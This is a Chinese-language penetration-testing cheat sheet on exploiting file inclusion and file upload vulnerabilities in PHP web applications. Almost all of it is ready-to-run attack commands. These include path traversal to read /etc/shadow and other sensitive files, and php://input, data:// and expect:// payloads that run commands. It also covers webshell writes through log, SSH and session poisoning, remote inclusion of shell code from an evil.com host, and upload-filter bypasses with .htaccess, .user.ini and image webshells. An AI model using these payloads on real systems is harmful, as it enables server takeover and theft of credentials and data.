---
id: 03-008
title: "📂 文件包含与上传利用 (File Inclusion & Upload Exploitation)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "Burp Suite, 自定义脚本, PHP filter chains"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# 📂 文件包含与上传利用 (File Inclusion & Upload Exploitation)

## 概述
利用文件包含漏洞（LFI/RFI）读取敏感文件或执行代码，利用文件上传漏洞获取服务器控制权。

## 核心技能

### 1. LFI基础利用

```bash
# 基础路径遍历
curl -s "https://example.com/page?file=../../../etc/passwd"
curl -s "https://example.com/page?file=../../../../etc/shadow"

# Windows文件读取
curl -s "https://example.com/page?file=../../../windows/win.ini"
curl -s "https://example.com/page?file=../../../windows/system32/drivers/etc/hosts"

# 读取源代码（PHP filter wrapper）
curl -s "https://example.com/page?file=php://filter/convert.base64-encode/resource=index.php"
# 解码base64结果
echo "PD9waHA..." | base64 -d

# 读取多级目录
curl -s "https://example.com/page?file=php://filter/convert.base64-encode/resource=../../config/database.php"
```

### 2. PHP Wrapper利用

```bash
# php://filter - 文件读取
# 单文件读取
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=config.php

# 链式过滤器（压缩/编码组合）
php://filter/zlib.deflate/convert.base64-encode/resource=index.php

# php://input - POST写入PHP代码
curl -s -X POST "https://example.com/page?file=php://input" \
  -d "<?php system('id'); system('ls -la'); ?>"

# php://input - 写WebShell
curl -s -X POST "https://example.com/page?file=php://input" \
  -d "<?php file_put_contents('shell.php', '<?php system(\$_GET[\"cmd\"]); ?>'); ?>"

# data:// - 直接执行代码
curl -s "https://example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

# expect:// - 命令执行（需要expect扩展）
curl -s "https://example.com/page?file=expect://id"
curl -s "https://example.com/page?file=expect://ls -la"
```

### 3. 日志注入GetShell

```bash
# Apache访问日志注入
# 1. 向User-Agent写入PHP代码
curl -s -A "<?php system(\$_GET['cmd']); ?>" "https://example.com/"

# 2. 包含日志文件
curl -s "https://example.com/page?file=/var/log/apache2/access.log&cmd=id"
curl -s "https://example.com/page?file=/var/log/httpd/access_log&cmd=id"
curl -s "https://example.com/page?file=/var/log/nginx/access.log&cmd=id"

# 3. 获取WebShell
curl -s -A "<?php file_put_contents('/var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>'); ?>" "https://example.com/"
curl -s "https://example.com/shell.php?cmd=id"

# SSH日志注入
# 1. 向SSH日志注入
ssh "<?php system(\$_GET['cmd']); ?>@target.com"

# 2. 包含SSH日志
curl -s "https://example.com/page?file=/var/log/auth.log&cmd=id"

# /proc/self/environ注入
# 1. 构造请求(User-Agent写入PHP)
curl -s -A "<?php system(\$_GET['cmd']); ?>" "https://example.com/cgi-bin/test.cgi"

# 2. 包含environ文件
curl -s "https://example.com/page?file=/proc/self/environ&cmd=id"
```

### 4. 远程文件包含 (RFI)

```bash
# 基础RFI
curl -s "https://example.com/page?file=http://evil.com/webshell.txt"
curl -s "https://example.com/page?file=https://evil.com/shell.php"

# 使用参数传递命令
curl -s "http://evil.com/shell.txt?cmd=id"

# RFI配合URL编码
curl -s "https://example.com/page?file=http://evil.com/shell%3Fcmd=id"

# SMB共享包含（Windows）
curl -s "https://example.com/page?file=\\\\192.168.1.100\\share\\shell.php"
```

### 5. 文件上传GetShell

```bash
# 基础文件上传
curl -s -F "file=@shell.php" https://example.com/upload.php

# 扩展名绕过
# 双扩展名
curl -s -F "file=@shell.php.jpg" https://example.com/upload.php

# 使用%00截断（PHP < 5.3.4）
curl -s -F "file=@shell.php%00.jpg" https://example.com/upload.php

# .htaccess文件上传 - 允许执行任意文件
curl -s -F "file=@.htaccess;filename=.htaccess" \
  --data-binary $'AddType application/x-httpd-php .jpg\n' \
  https://example.com/upload.php

# 上传.user.ini（PHP-FPM）
curl -s -F "file=@.user.ini" \
  --data-binary "auto_prepend_file=shell.jpg" \
  https://example.com/upload.php

# 图片马制作
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# 或直接追加
echo '<?php system($_GET["cmd"]); ?>' >> image.jpg

# SVG文件上传XSS
curl -s -F "file=@xss.svg" https://example.com/upload.php
# xss.svg内容:
# <?xml version="1.0" encoding="UTF-8"?>
# <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# ZIP解压目录遍历
# 创建包含符号链接的ZIP
ln -s /etc/passwd link
zip --symlinks malicious.zip link
```

### 6. 文件包含链式攻击

```bash
# 配合临时文件（PHP文件上传时）
# PHP上传文件会在/tmp/phpXXXXXX生成临时文件
# 需要竞态条件包含

# PHP Session文件包含
# 1. 发送请求创建Session
curl -s -c cookies.txt "https://example.com/page?file=php://filter/convert.base64-encode/resource=index.php"

# 2. 在Session中注入payload
# 发送包含payload的POST请求
curl -s -b cookies.txt -X POST -d "username=<?php system('id'); ?>" "https://example.com/login.php"

# 3. 包含Session文件
curl -s "https://example.com/page?file=/tmp/sess_SESSIONID"

# phpinfo + LFI 组合利用
# 1. 通过phpinfo找到临时文件路径
# 2. 在文件被删除前包含它
# 使用自动化脚本: https://github.com/ianxtianxt/LFI-phpinfo
```

### 7. LFI自动化工具

```bash
# LFISuite
python lfisuite.py
# 选择选项: 1 (扫描)

# Kadimus
kadimus -u "https://example.com/page?file="

# LFIHunter
lfihunter -l targets.txt
```

## 常见包含路径速查

| 系统 | 文件路径 |
|:---|:---|
| Linux | /etc/passwd, /etc/shadow, /etc/issue, /proc/version |
| Linux | /var/log/apache2/access.log, /var/log/nginx/access.log |
| Linux | /proc/self/environ, /proc/self/fd/0-50 |
| Linux | /etc/php.ini, /etc/httpd.conf, /etc/nginx/nginx.conf |
| Windows | C:\boot.ini, C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts |
| Windows | C:\windows\php.ini, C:\windows\system32\inetsrv\metabase.xml |
| Windows | C:\Program Files\Apache Group\Apache2\conf\httpd.conf |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Kadimus | LFI/RFI扫描利用 | https://github.com/P0cL4bs/Kadimus |
| LFISuite | LFI自动化工具 | https://github.com/D35m0nd142/LFISuite |
| php_filter_chain | PHP filter链生成 | https://github.com/synacktiv/php_filter_chain_generator |
| Weevely | PHP WebShell生成 | https://github.com/epinna/weevely3 |

## 参考资源
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
